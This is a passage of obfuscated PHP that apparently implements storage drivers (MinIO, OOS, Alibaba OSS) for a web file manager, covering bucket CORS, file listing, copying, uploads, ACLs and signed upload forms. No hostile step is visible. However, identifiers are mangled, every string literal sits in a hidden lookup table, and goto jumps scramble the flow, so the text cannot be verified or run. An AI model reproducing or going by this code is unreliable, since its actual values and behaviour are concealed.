$f÷ŠŠºŠÕ¤[$Fâ¿ĞÕËîˆ[977]]) { $f÷ŠŠºŠÕ¤[$Fâ¿ĞÕËîˆ[680]] = 1; } Cache::set($Fâ¿ĞÕËîˆ[978] . $cä—Êˆä»™->task[$Fâ¿ĞÕËîˆ[367]], $f÷ŠŠºŠÕ¤); $cä—Êˆä»™->end(); } private function sqlEncode($cğ¦ª·íóİ) { $B¾­ÂÍ¯¾Ø =& $_SERVER[“]; $béËÊªğÑ = array(); foreach ($cğ¦ª·íóİ as $BÑ”’ª‡—‰) { if (is_array($BÑ”’ª‡—‰)) { $BÑ”’ª‡—‰ = json_encode_force($BÑ”’ª‡—‰); } $BÑ”’ª‡—‰ = addslashes($BÑ”’ª‡—‰); $BÑ”’ª‡—‰ = str_replace(array($B¾­ÂÍ¯¾Ø[979], $B¾­ÂÍ¯¾Ø[217]), array($B¾­ÂÍ¯¾Ø[980], $B¾­ÂÍ¯¾Ø[981]), $BÑ”’ª‡—‰); $béËÊªğÑ[] = str_replace($B¾­ÂÍ¯¾Ø[55], $B¾­ÂÍ¯¾Ø[982], $BÑ”’ª‡—‰); } return $B¾­ÂÍ¯¾Ø[55] . implode($B¾­ÂÍ¯¾Ø[983], $béËÊªğÑ) . $B¾­ÂÍ¯¾Ø[55]; } private function sqlDecode($bï‘±¹µèâ, $eì‡‚ÚÉÉ) { $E¡ªö’ä• =& $_SERVER[“]; $bï‘±¹µèâ = str_replace(array($E¡ªö’ä•[980], $E¡ªö’ä•[981]), array($E¡ªö’ä•[979], $E¡ªö’ä•[217]), $bï‘±¹µèâ); if ($eì‡‚ÚÉÉ == $E¡ªö’ä•[9]) { $bï‘±¹µèâ = stripslashes($bï‘±¹µèâ); } return $bï‘±¹µèâ; } } goto BÅ¨Ğó…À; E¬¼×¿Š: class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($B§Ã¢‡‘Œ³) { parent::__construct($B§Ã¢‡‘Œ³); $this->signatureVersion($_SERVER[“][200]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($D¨í‡ˆöö) { parent::__construct($D¨í‡ˆöö); $this->signatureVersion($_SERVER[“][200]); } public function fileOutLink($E¤¦‹‹ô‰…) { $f³¢®‘£¡– =& $_SERVER[“]; if (substr($E¤¦‹‹ô‰…, 0, 7) == $f³¢®‘£¡–[1102]) { $E¤¦‹‹ô‰… = $f³¢®‘£¡–[1103] . substr($E¤¦‹‹ô‰…, 7); } header($f³¢®‘£¡–[156] . $E¤¦‹‹ô‰…); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public function __construct($e¥Æ¡‡äº×) { parent::__construct(); include_once SDK_DIR . $_SERVER[“][1158]; $this->_init($e¥Æ¡‡äº×); } public function _init($AÃÓ»Ü¢åç) { foreach ($AÃÓ»Ü¢åç as $dÎø¢è»£å => $bø®†È¬á) { if (isset($this->{$dÎø¢è»£å})) { $this->{$dÎø¢è»£å} = $bø®†È¬á; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[“][1159], !1); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto d¡‡âÜ“á‘; d‰øâŞ®Ì : $b¢“µÀ¦“È->setMaxAgeSeconds(600); $b¢“µÀ¦“È->addExposeHeader($CĞõïºØ‘[1165]); $b¢“µÀ¦“È->addAllowedHeader($CĞõïºØ‘[1160]); goto f¹¤Üˆ±î˜; f¹¤Üˆ±î˜: $f¦Şù…ñÛé->addRule($b¢“µÀ¦“È); try { $this->client->putBucketCors($this->bucket, $f¦Şù…ñÛé); } catch (OSS\Core\OssException $fØğÀÓìöŒ) { return !1; } return !0; goto aè¤¯‰ë›; d¡‡âÜ“á‘: $CĞõïºØ‘ =& $_SERVER[“]; $f¦Şù…ñÛé = new OSS\Model\CorsConfig(); $b¢“µÀ¦“È = new OSS\Model\CorsRule(); goto C£à­Ò•ä¢; C£à­Ò•ä¢: $b¢“µÀ¦“È->addAllowedOrigin($CĞõïºØ‘[1160]); $b¢“µÀ¦“È->addAllowedMethod($CĞõïºØ‘[1161]); $b¢“µÀ¦“È->addAllowedMethod($CĞõïºØ‘[1162]); goto eÎçèÂ¦ò; eÎçèÂ¦ò: $b¢“µÀ¦“È->addAllowedMethod($CĞõïºØ‘[1163]); $b¢“µÀ¦“È->addAllowedMethod($CĞõïºØ‘[1164]); $b¢“µÀ¦“È->addAllowedMethod($CĞõïºØ‘[155]); goto d‰øâŞ®Ì ; aè¤¯‰ë›: } public function getBucketCors() { goto fÁ‚îâÎ¼–; eÈ–šĞÉİ‚: $FÑğ•»İôî = $dÍ¬ÄÆÈÓÂ[0]->getMaxAgeSeconds(); $CÓÑ×ÀåàÉ = $dÍ¬ÄÆÈÓÂ[0]->getExposeHeaders(); $e‚šæ‘¼À = $dÍ¬ÄÆÈÓÂ[0]->getAllowedHeaders(); goto aŒ¤„éÑŒ; aŒ¤„éÑŒ: return array($c°’¦äÅ±ù[175] => isset($bòßÊÃ[0]) ? $bòßÊÃ[0] : $c°’¦äÅ±ù[33], $c°’¦äÅ±ù[179] => $e£š›—…­Î, $c°’¦äÅ±ù[1166] => $FÑğ•»İôî, $c°’¦äÅ±ù[1167] => isset($CÓÑ×ÀåàÉ[0]) ? $CÓÑ×ÀåàÉ[0] : $c°’¦äÅ±ù[33], $c°’¦äÅ±ù[177] => isset($e‚šæ‘¼À[0]) ? $e‚šæ‘¼À[0] : $c°’¦äÅ±ù[33]); goto bÛÙá’ƒ´Œ; fÁ‚îâÎ¼–: $c°’¦äÅ±ù =& $_SERVER[“]; $aİµô†êØ = null; try { $aİµô†êØ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $A£‘Ëšˆ) { return null; } goto d‹œÊ©ÒŒä; d‹œÊ©ÒŒä: if (!$aİµô†êØ || !($dÍ¬ÄÆÈÓÂ = $aİµô†êØ->getRules())) { return null; } $bòßÊÃ = $dÍ¬ÄÆÈÓÂ[0]->getAllowedOrigins(); $e£š›—…­Î = $dÍ¬ÄÆÈÓÂ[0]->getAllowedMethods(); goto eÈ–šĞÉİ‚; bÛÙá’ƒ´Œ: } public function isBucketCors() { goto B’˜Ÿ‰òï¥; B’˜Ÿ‰òï¥: $C¹®Âãë“¸ =& $_SERVER[“]; $BõÜ†¡¸Šô = $this->getBucketCors(); if (!$BõÜ†¡¸Šô || !is_array($BõÜ†¡¸Šô)) { return !1; } goto Cêà¬ˆ»Ê†; c×¸ä²ãŠ: $dßî…ª£ = array($C¹®Âãë“¸[180], $C¹®Âãë“¸[181], $C¹®Âãë“¸[182], $C¹®Âãë“¸[183], $C¹®Âãë“¸[184]); $E—ÒÓ×Ğ² = array_diff($dßî…ª£, $D«°…Ğê¹Â); return empty($E—ÒÓ×Ğ²); goto C¼—Šßºì; Cêà¬ˆ»Ê†: if ($BõÜ†¡¸Šô[$C¹®Âãë“¸[175]] != $C¹®Âãë“¸[176] || $BõÜ†¡¸Šô[$C¹®Âãë“¸[177]] != $C¹®Âãë“¸[176]) { return !1; } $D«°…Ğê¹Â = array_map($C¹®Âãë“¸[178], $BõÜ†¡¸Šô[$C¹®Âãë“¸[179]]); if (!is_array($D«°…Ğê¹Â)) { $D«°…Ğê¹Â = array(); } goto c×¸ä²ãŠ; C¼—Šßºì: } public function mkfile($f‘˜ØïæĞÎ, $BË±ËÔ£ØÉ = '', $d‡ãĞ—ÍÀ = REPEAT_RENAME) { $c†Šê¸ˆ³ê = $this->setContent($f‘˜ØïæĞÎ, $BË±ËÔ£ØÉ); if ($c†Šê¸ˆ³ê !== !1) { return $this->getPathOuter($f‘˜ØïæĞÎ); } return !1; } public function mkdir($f¦¸’íåÓ, $CßÀÈŞ‚ë = REPEAT_SKIP) { if ($this->_isFolder($f¦¸’íåÓ)) { return $this->getPathOuter($f¦¸’íåÓ); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($f¦¸’íåÓ)); } catch (OSS\Core\OssException $dëĞ×ƒ©Å) { return !1; } return $this->getPathOuter($f¦¸’íåÓ); } private function fileList($cªÄ…îŸÌ™, $e‡ÃŒÅ½®¨ = '', $D‹›³¼š» = 0) { goto FÅç†Ÿ‘„Ä; dİÁ­…‡•À: while (!0) { $eø¾ì‹°ç = array($f¿ğÔßÃÛ™[1168] => $e‡ÃŒÅ½®¨, $f¿ğÔßÃÛ™[186] => $F³Õ¥È´, $f¿ğÔßÃÛ™[1169] => $dö´÷®„²‘, $f¿ğÔßÃÛ™[1170] => $C˜¿È«ÂÂ); try { $E•‰ˆÇ° = $this->client->listObjects($this->bucket, $eø¾ì‹°ç); } catch (OSS\Core\OssException $f¿³­Ã”‰õ) { break; } $C˜¿È«ÂÂ = $E•‰ˆÇ°->getNextMarker(); $f™ŞÆâÆİõ = $E•‰ˆÇ°->getObjectList(); $fƒŠ ºã‹õ = $E•‰ˆÇ°->getPrefixList(); foreach ($f™ŞÆâÆİõ as $fÆçôÙÛ‹œ) { if ($fÆçôÙÛ‹œ->getKey() == $F³Õ¥È´) { continue; } $EÃ¹°Î¾Ÿ = $fÆçôÙÛ‹œ->getKey(); if ($D‹›³¼š») { $EÃ¹°Î¾Ÿ = array($f¿ğÔßÃÛ™[28] => $EÃ¹°Î¾Ÿ, $f¿ğÔßÃÛ™[77] => $fÆçôÙÛ‹œ->getSize(), $f¿ğÔßÃÛ™[190] => strtotime($fÆçôÙÛ‹œ->getLastModified())); } $Càî¼¡Ñ­…[] = $EÃ¹°Î¾Ÿ; } foreach ($fƒŠ ºã‹õ as $eç„ –šï) { $F‚ì¼áˆÁÈ[] = $eç„ –šï->getPrefix(); } if ($C˜¿È«ÂÂ === $f¿ğÔßÃÛ™[33]) { break; } } return array($f¿ğÔßÃÛ™[74] => $F‚ì¼áˆÁÈ, $f¿ğÔßÃÛ™[73] => $Càî¼¡Ñ­…); goto cˆîÏä«Şˆ; d”ößß ¡Ø: $C˜¿È«ÂÂ = $f¿ğÔßÃÛ™[33]; $dö´÷®„²‘ = 1000; $F‚ì¼áˆÁÈ = $Càî¼¡Ñ­… = array(); goto dİÁ­…‡•À; FÅç†Ÿ‘„Ä: $f¿ğÔßÃÛ™ =& $_SERVER[“]; $cªÄ…îŸÌ™ = trim($cªÄ…îŸÌ™, $f¿ğÔßÃÛ™[8]); $F³Õ¥È´ = empty($cªÄ…îŸÌ™) ? $f¿ğÔßÃÛ™[33] : $cªÄ…îŸÌ™ . $f¿ğÔßÃÛ™[8]; goto d”ößß ¡Ø; cˆîÏä«Şˆ: } public function copyFile($DœÊ¤®œèï, $A¶ÌçÓ¢³õ) { $fƒ‘áŠ°¨Œ = $this->size($DœÊ¤®œèï); if ($fƒ‘áŠ°¨Œ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $DœÊ¤®œèï, $this->bucket, $this->pathEncode($A¶ÌçÓ¢³õ)); } catch (OSS\Core\OssException $AÔ–ï­Ç) { return !1; } return $this->getPathOuter($A¶ÌçÓ¢³õ); } $d´İØ…çÀ˜ = $this->multiCopyObject($DœÊ¤®œèï, $A¶ÌçÓ¢³õ, $fƒ‘áŠ°¨Œ); return $d´İØ…çÀ˜ ? $this->getPathOuter($A¶ÌçÓ¢³õ) : !1; } private function multiCopyObject($aÎÀó°éÈ¦, $fÛÔÌÖ, $Eù»é¬àÓ) { $aŞÌÊË×ã¥ =& $_SERVER[“]; try { goto B¹Ï¬¡£Î; B¹Ï¬¡£Î: $DŒä­ŠÄ‡Á = array(); if ($CªÒß½÷ó‰ = $this->hashMd5($aÎÀó°éÈ¦)) { $DŒä­ŠÄ‡Á = array(OSS\OssClient::OSS_HEADERS => array($aŞÌÊË×ã¥[1171] => $CªÒß½÷ó‰)); } $fÆª‚‚”„— = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($fÛÔÌÖ), $DŒä­ŠÄ‡Á); goto fãÊš„Üè; cŞˆ­ŞÕ™¨: $EŒÖÑÊøîÛ = array(); foreach ($d¿—‚Ÿ¢ˆá as $C¿Õ££¿¯ => $a›Ù‘„®·) { $EŒÖÑÊøîÛ[] = array($aŞÌÊË×ã¥[1175] => $C¿Õ££¿¯ + 1, $aŞÌÊË×ã¥[1176] => $a›Ù‘„®·); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($fÛÔÌÖ), $fÆª‚‚”„—, $EŒÖÑÊøîÛ); goto a®›è·²Ëù; AÜÁ÷à£›: $aóã´á¨ = 1024 * 1024 * 10; $BƒÕ¹ÕÕîä = $this->client->generateMultiuploadParts($Eù»é¬àÓ, $aóã´á¨); foreach ($BƒÕ¹ÕÕîä as $C¿Õ££¿¯ => $còíƒ¦Óí ) { $DãÌİŠËË… = $Fùã÷‚Ï…ë + (int) $còíƒ¦Óí [$aŞÌÊË×ã¥[1172]]; $fËìùßÄğ¶ = (int) $còíƒ¦Óí [$aŞÌÊË×ã¥[325]] + $DãÌİŠËË… - 1; $b©ƒñçáö = array($aŞÌÊË×ã¥[1173] => $DãÌİŠËË…, $aŞÌÊË×ã¥[1174] => $fËìùßÄğ¶); $d¿—‚Ÿ¢ˆá[] = $this->client->uploadPartCopy($this->bucket, $aÎÀó°éÈ¦, $this->bucket, $this->pathEncode($fÛÔÌÖ), $Aù½Ş£ì˜, $fÆª‚‚”„—, $b©ƒñçáö); $Aù½Ş£ì˜ = $Aù½Ş£ì˜ + 1; } goto cŞˆ­ŞÕ™¨; fãÊš„Üè: $Aù½Ş£ì˜ = 1; $Fùã÷‚Ï…ë = 0; $d¿—‚Ÿ¢ˆá = array(); goto AÜÁ÷à£›; a®›è·²Ëù: } catch (OSS\Core\OssException $aŞÇº—¤Äë) { return !1; } return !0; } public function moveFile($d™âëß„¾½, $døÆãÇ±ë) { if ($this->copyFile($d™âëß„¾½, $døÆãÇ±ë)) { $this->remove($d™âëß„¾½); return $this->getPathOuter($døÆãÇ±ë); } return !1; } public function delFile($fÊÓçÙË¡Ğ) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($fÊÓçÙË¡Ğ)); } catch (OSS\Core\OssException $B”˜¨›İ–Ö) { return !1; } return !0; } public function delFolder($A¾ÎïŒñ¶) { $B¤¿•§†ÎØ =& $_SERVER[“]; $e¹µøÙ‚Ú¾ = $this->fileList($A¾ÎïŒñ¶); if (!empty($A¾ÎïŒñ¶) && !in_array(trim($A¾ÎïŒñ¶, $B¤¿•§†ÎØ[8]) . $B¤¿•§†ÎØ[8], $e¹µøÙ‚Ú¾[$B¤¿•§†ÎØ[73]])) { $e¹µøÙ‚Ú¾[$B¤¿•§†ÎØ[73]][] = trim($A¾ÎïŒñ¶, $B¤¿•§†ÎØ[8]) . $B¤¿•§†ÎØ[8]; } foreach (array_chunk($e¹µøÙ‚Ú¾[$B¤¿•§†ÎØ[73]], 1000) as $b ³—Ã­‰) { try { $this->client->deleteObjects($this->bucket, $b ³—Ã­‰); } catch (OSS\Core\OssException $d…Ã¡¨’Ÿ) { continue; } } return !0; } public function rename($B­›Éá«”, $f÷¶Ë¨Òñ) { return $this->renameObject($B­›Éá«”, $f÷¶Ë¨Òñ); } private function fileInfo($D–ĞÎù‘·, $bº¡Ã¨·‹ö = array()) { goto C‘âö÷äÙõ; C‘âö÷äÙõ: $fÂš¾ñãÎĞ =& $_SERVER[“]; $dÛ¥‹åÈ® = array($fÂš¾ñãÎĞ[28] => $this->pathThis($D–ĞÎù‘·), $fÂš¾ñãÎĞ[75] => $this->getPathOuter($D–ĞÎù‘·), $fÂš¾ñãÎĞ[29] => $fÂš¾ñãÎĞ[167], $fÂš¾ñãÎĞ[187] => 0, $fÂš¾ñãÎĞ[107] => 0, $fÂš¾ñãÎĞ[77] => 0, $fÂš¾ñãÎĞ[160] => $this->ext($D–ĞÎù‘·), $fÂš¾ñãÎĞ[188] => !0, $fÂš¾ñãÎĞ[189] => !0); if (empty($bº¡Ã¨·‹ö)) { $dŒ¤Š…‡ë = $this->objectMeta($D–ĞÎù‘·); if (!$dŒ¤Š…‡ë) { return $dÛ¥‹åÈ®; } $bº¡Ã¨·‹ö = array($fÂš¾ñãÎĞ[107] => strtotime($dŒ¤Š…‡ë[$fÂš¾ñãÎĞ[1177]]), $fÂš¾ñãÎĞ[77] => $dŒ¤Š…‡ë[$fÂš¾ñãÎĞ[1178]] + 0); } goto C•à¾ëèà÷; eÀ’Í¼™í¾: return $dÛ¥‹åÈ®; goto DœÕåêÔ; C•à¾ëèà÷: if (isset($bº¡Ã¨·‹ö[$fÂš¾ñãÎĞ[77]])) { $dÛ¥‹åÈ®[$fÂš¾ñãÎĞ[77]] = $bº¡Ã¨·‹ö[$fÂš¾ñãÎĞ[77]]; } if (isset($bº¡Ã¨·‹ö[$fÂš¾ñãÎĞ[107]])) { $dÛ¥‹åÈ®[$fÂš¾ñãÎĞ[107]] = $bº¡Ã¨·‹ö[$fÂš¾ñãÎĞ[107]]; } if (isset($bº¡Ã¨·‹ö[$fÂš¾ñãÎĞ[190]]) && !trim($dÛ¥‹åÈ®[$fÂš¾ñãÎĞ[107]])) { $dÛ¥‹åÈ®[$fÂš¾ñãÎĞ[107]] = $bº¡Ã¨·‹ö[$fÂš¾ñãÎĞ[190]]; } goto eÀ’Í¼™í¾; DœÕåêÔ: } private function folderInfo($E·Á·­¨¾—, $dª­âä˜ã = array()) { $d˜¹Íâª‰ß =& $_SERVER[“]; $CÂø³Ã”è = array($d˜¹Íâª‰ß[28] => $this->pathThis($E·Á·­¨¾—), $d˜¹Íâª‰ß[75] => $this->getPathOuter($d˜¹Íâª‰ß[8] . $E·Á·­¨¾—), $d˜¹Íâª‰ß[29] => $d˜¹Íâª‰ß[76], $d˜¹Íâª‰ß[187] => 0, $d˜¹Íâª‰ß[107] => 0, $d˜¹Íâª‰ß[188] => !0, $d˜¹Íâª‰ß[189] => !0); if (empty($dª­âä˜ã)) { $E·Á·­¨¾— = rtrim($E·Á·­¨¾—, $d˜¹Íâª‰ß[8]) . $d˜¹Íâª‰ß[8]; $dÔ‹®ÉÛ‚Ş = $this->objectMeta($E·Á·­¨¾—); if (!$dÔ‹®ÉÛ‚Ş) { return $CÂø³Ã”è; } $dª­âä˜ã = array($d˜¹Íâª‰ß[187] => $dÔ‹®ÉÛ‚Ş[$d˜¹Íâª‰ß[1179]][$d˜¹Íâª‰ß[1180]], $d˜¹Íâª‰ß[107] => strtotime($dÔ‹®ÉÛ‚Ş[$d˜¹Íâª‰ß[1177]])); } if (isset($dª­âä˜ã[$d˜¹Íâª‰ß[107]])) { $CÂø³Ã”è[$d˜¹Íâª‰ß[107]] = $dª­âä˜ã[$d˜¹Íâª‰ß[107]]; } if (isset($dª­âä˜ã[$d˜¹Íâª‰ß[187]])) { $CÂø³Ã”è[$d˜¹Íâª‰ß[187]] = $dª­âä˜ã[$d˜¹Íâª‰ß[187]]; } return $CÂø³Ã”è; } public function listPath($Aß­îöÓ ¥, $DÀ¿‚œ¤‡” = false) { $f³Å ˆ…ˆö =& $_SERVER[“]; $fğ‹Ÿ‚œñ = $this->fileList($Aß­îöÓ ¥, $f³Å ˆ…ˆö[8], !0); foreach ($fğ‹Ÿ‚œñ[$f³Å ˆ…ˆö[74]] as $C—Ã¨›øù => $D§‚»‹¯Ê) { $fğ‹Ÿ‚œñ[$f³Å ˆ…ˆö[74]][$C—Ã¨›øù] = $this->folderInfo($D§‚»‹¯Ê, $D§‚»‹¯Ê); } foreach ($fğ‹Ÿ‚œñ[$f³Å ˆ…ˆö[73]] as $C—Ã¨›øù => $D§‚»‹¯Ê) { $fğ‹Ÿ‚œñ[$f³Å ˆ…ˆö[73]][$C—Ã¨›øù] = $this->fileInfo($D§‚»‹¯Ê[$f³Å ˆ…ˆö[28]], $D§‚»‹¯Ê); } return $fğ‹Ÿ‚œñ; } public function has($b¹Éá³›‰˜, $a ÒèÙÑÏ = false, $dÍ”µ—çóŸ = true) { goto dÀŞ°¥Ê˜; dçµŠÃôÂŠ: $EÁ–ìäõ™ò = $fù“Û¬‡µÊ[33]; $dˆ‰‹±–˜ñ = 500; $CÂ¡¬Ş“å = 0; goto cá²Âöá›; dÀŞ°¥Ê˜: $fù“Û¬‡µÊ =& $_SERVER[“]; $b¹Éá³›‰˜ = trim($b¹Éá³›‰˜, $fù“Û¬‡µÊ[8]); $Cšã³ÜÙ»Ã = empty($b¹Éá³›‰˜) ? $fù“Û¬‡µÊ[33] : $b¹Éá³›‰˜ . $fù“Û¬‡µÊ[8]; goto dçµŠÃôÂŠ; cá²Âöá›: $Eˆ·¦õ¶„ = 0; while (!0) { $c ‰ª£Í»“ = array($fù“Û¬‡µÊ[1168] => $fù“Û¬‡µÊ[8], $fù“Û¬‡µÊ[186] => $Cšã³ÜÙ»Ã, $fù“Û¬‡µÊ[1169] => $dˆ‰‹±–˜ñ, $fù“Û¬‡µÊ[1170] => $EÁ–ìäõ™ò); try { $A­”¦ºŒì• = $this->client->listObjects($this->bucket, $c ‰ª£Í»“); } catch (OSS\Core\OssException $B£ù‹ì‡š¢) { break; } $EÁ–ìäõ™ò = $A­”¦ºŒì•->getNextMarker(); $Böó¬½Ò = $A­”¦ºŒì•->getObjectList(); $B‘Ç‚ê†Ğ = $A­”¦ºŒì•->getPrefixList(); if ($a ÒèÙÑÏ) { if (count($Böó¬½Ò) > 1 || count($Böó¬½Ò) == 1 && $Böó¬½Ò[0]->getKey() != $Cšã³ÜÙ»Ã) { $CÂ¡¬Ş“å += count($Böó¬½Ò) - 1; } if (!empty($B‘Ç‚ê†Ğ)) { $Eˆ·¦õ¶„ += count($B‘Ç‚ê†Ğ); } if ($EÁ–ìäõ™ò === $fù“Û¬‡µÊ[33]) { break; } continue; } if ($dÍ”µ—çóŸ) { if (!empty($Böó¬½Ò)) { if (count($Böó¬½Ò) > 1 || $Böó¬½Ò[0]->getKey() != $Cšã³ÜÙ»Ã) { return !0; } } } else { if (!empty($B‘Ç‚ê†Ğ)) { return !0; } } if ($EÁ–ìäõ™ò === $fù“Û¬‡µÊ[33]) { break; } } if ($a ÒèÙÑÏ) { return array($fù“Û¬‡µÊ[191] => $CÂ¡¬Ş“å, $fù“Û¬‡µÊ[192] => $Eˆ·¦õ¶„); } goto Dğ¤¹›ğ—Œ; Dğ¤¹›ğ—Œ: return !1; goto DÆÎòñõÔ; DÆÎòñõÔ: } public function listAll($d±›º¿ö‚) { $dÀñóöÅší =& $_SERVER[“]; $aæ©Ò¢ÈÉ³ = $this->fileList($d±›º¿ö‚, $dÀñóöÅší[33], !0); $cÏíÃ•©¢½ = array(); foreach ($aæ©Ò¢ÈÉ³[$dÀñóöÅší[73]] as $A°£»‘Ğì˜) { $cÏíÃ•©¢½[$A°£»‘Ğì˜[$dÀñóöÅší[28]]] = $A°£»‘Ğì˜[$dÀñóöÅší[77]]; } return $this->listAllFiles($d±›º¿ö‚, array_keys($cÏíÃ•©¢½), $cÏíÃ•©¢½); } public function canRead($F’¡Î•‘Ğ) { $aŠÂ¯„µ—Ó =& $_SERVER[“]; $DÕª£Ø’‹ = $this->pathAcl($F’¡Î•‘Ğ); return $DÕª£Ø’‹ == $aŠÂ¯„µ—Ó[1181] || $DÕª£Ø’‹ == $aŠÂ¯„µ—Ó[493] ? !0 : !1; } public function canWrite($E®”¥­Ô) { $a±íîŠîã = $this->pathAcl($E®”¥­Ô); return $a±íîŠîã == $_SERVER[“][493] ? !0 : !1; } public function pathAcl($AËÁ²ó®) { goto F½‚òŠÆ¤Â; D¦ï‡»¢À‘: return $BŸ¨ª‡…œ; goto DÆíßñöŞ; eÜËêğ²ƒÕ: $BŸ¨ª‡…œ = $dø•´‰É´à == $AÁÊíƒ“[34] ? $this->bucketAcl : $dø•´‰É´à; if ($BŸ¨ª‡…œ == $AÁÊíƒ“[1182]) { return $AÁÊíƒ“[1181]; } if ($BŸ¨ª‡…œ == $AÁÊíƒ“[1183]) { return $AÁÊíƒ“[493]; } goto D¦ï‡»¢À‘; F½‚òŠÆ¤Â: $AÁÊíƒ“ =& $_SERVER[“]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $dø•´‰É´à = $this->client->getObjectAcl($this->bucket, $this->pathEncode($AËÁ²ó®)); } catch (OSS\Core\OssException $c’®ĞÈŠˆ) { return !1; } goto eÜËêğ²ƒÕ; DÆíßñöŞ: } private function chmodPath($e²Ô‹öºÀƒ, $cç”¨òÙêï = '') { $F„‰Ã¦Õ¸Ó =& $_SERVER[“]; $aÂÔŞåÃ¿¼ = empty($cç”¨òÙêï) ? $F„‰Ã¦Õ¸Ó[1183] : $cç”¨òÙêï; $FõÍÏ„’Œ = array($F„‰Ã¦Õ¸Ó[34], $F„‰Ã¦Õ¸Ó[185], $F„‰Ã¦Õ¸Ó[1182], $F„‰Ã¦Õ¸Ó[1183]); if (!in_array($aÂÔŞåÃ¿¼, $FõÍÏ„’Œ)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($e²Ô‹öºÀƒ), $aÂÔŞåÃ¿¼); } catch (OSS\Core\OssException $bİ¬¤Ú‡Œ´) { return !1; } return !0; } public function getContent($a•—×áÏ»Õ) { return $this->fileSubstr($a•—×áÏ»Õ, -1); } public function setContent($b ÌÅÈ–ìª, $cÙÕ¬Š—”õ = '') { $B ìØÎ… =& $_SERVER[“]; try { $eÓÜ¢ààÀÜ = $this->trafficLimit($B ìØÎ…[1184]); $F¯ÇÜ‘Œù‘ = $this->client->putObject($this->bucket, $this->pathEncode($b ÌÅÈ–ìª), $cÙÕ¬Š—”õ, $eÓÜ¢ààÀÜ); } catch (OSS\Core\OssException $BÎÚÃÈ°Œ) { return !1; } $Cğ“§˜›–³ = array($B ìØÎ…[1171] => trim($F¯ÇÜ‘Œù‘[$B ìØÎ…[1185]], $B ìØÎ…[113]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($b ÌÅÈ–ìª))); $this->updateObjMeta($b ÌÅÈ–ìª, $Cğ“§˜›–³); return isset($F¯ÇÜ‘Œù‘[$B ìØÎ…[1186]][$B ìØÎ…[1133]]) ? (int) $F¯ÇÜ‘Œù‘[$B ìØÎ…[1186]][$B ìØÎ…[1133]] : strlen($F¯ÇÜ‘Œù‘); } private function updateObjMeta($e‹æ¨¶åÃ†, $a¡°ç˜ç‚‚) { $e‹æ¨¶åÃ† = $this->pathEncode($e‹æ¨¶åÃ†); try { $d–„¼ Â¦„ = array(OSS\OssClient::OSS_HEADERS => $a¡°ç˜ç‚‚); $this->client->copyObject($this->bucket, $e‹æ¨¶åÃ†, $this->bucket, $e‹æ¨¶åÃ†, $d–„¼ Â¦„); } catch (OSS\Core\OssException $dÈÆéÑÑ»…) { return !1; } return !0; } public function upload($dËæ½ …œĞ, $B­Öî¤Ã½°, $Cæ·Çñ·ñ = false, $c­Í ±Îõ„ = REPEAT_REPLACE) { $dïŞ¨é‚¼¢ =& $_SERVER[“]; $Bá–¶îì’ = trim($dËæ½ …œĞ, $dïŞ¨é‚¼¢[8]); $Eï÷Şî½­ï = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($dïŞ¨é‚¼¢[1171] => @md5_file($B­Öî¤Ã½°)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($dËæ½ …œĞ))); $Eï÷Şî½­ï = $this->trafficLimit($dïŞ¨é‚¼¢[1184], $Eï÷Şî½­ï); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($Bá–¶îì’), $B­Öî¤Ã½°, $Eï÷Şî½­ï); } catch (OSS\Core\OssException $D‹‰µÈ°«) { return !1; } return $this->getPathOuter($dËæ½ …œĞ); } public function getHost() { $a¿ùËøŞã¶ =& $_SERVER[“]; $BƒãÆîÒ‰ = explode($a¿ùËøŞã¶[171], parent::getHost()); return $BƒãÆîÒ‰[0] . $a¿ùËøŞã¶[171] . $this->bucket . $a¿ùËøŞã¶[91] . $BƒãÆîÒ‰[1]; } public function uploadFormData($CŞò£¯ª, $cÆ†¢çÚô÷ = 3600) { goto bğ¦çÜºâ; bôŒ—ÚË˜Ü: $FˆŸÙ—¡¯ = strpos($aºœ¦¹¯‹, $C²çÂƒï[284]); $aºœ¦¹¯‹ = substr($aºœ¦¹¯‹, 0, $FˆŸÙ—¡¯) . $C²çÂƒï[1188]; $dï”ÅÄÜ‹É = 1048576000 * 5; goto Fñ‰¼²†Åó; DÓ…·°‚Ë: return $c°êÆåôç¤; goto e«ãßÙ˜–; Cùæ†Å›„: $Fƒİâ¾Š„ = base64_encode(hash_hmac($C²çÂƒï[218], $DÒîó„Ë‘, $this->secret, !0)); $c°êÆåôç¤ = array($C²çÂƒï[1099] => $DÒîó„Ë‘, $C²çÂƒï[1190] => $this->accessKey, $C²çÂƒï[1095] => $C²çÂƒï[1087], $C²çÂƒï[1191] => $Fƒİâ¾Š„, $C²çÂƒï[169] => $Dš‰Âàİ¹ñ); $c°êÆåôç¤ = $this->trafficLimit($C²çÂƒï[1184], $c°êÆåôç¤); goto DÓ…·°‚Ë; eè‘©Âò¸: $cçÈºØç“Ä = date($C²çÂƒï[1187], time() + $aå¶õ©–£ù); $AåÉä‡»å¸ = new DateTime($cçÈºØç“Ä); $aºœ¦¹¯‹ = $AåÉä‡»å¸->format(DateTime::ISO8601); goto bôŒ—ÚË˜Ü; bğ¦çÜºâ: $C²çÂƒï =& 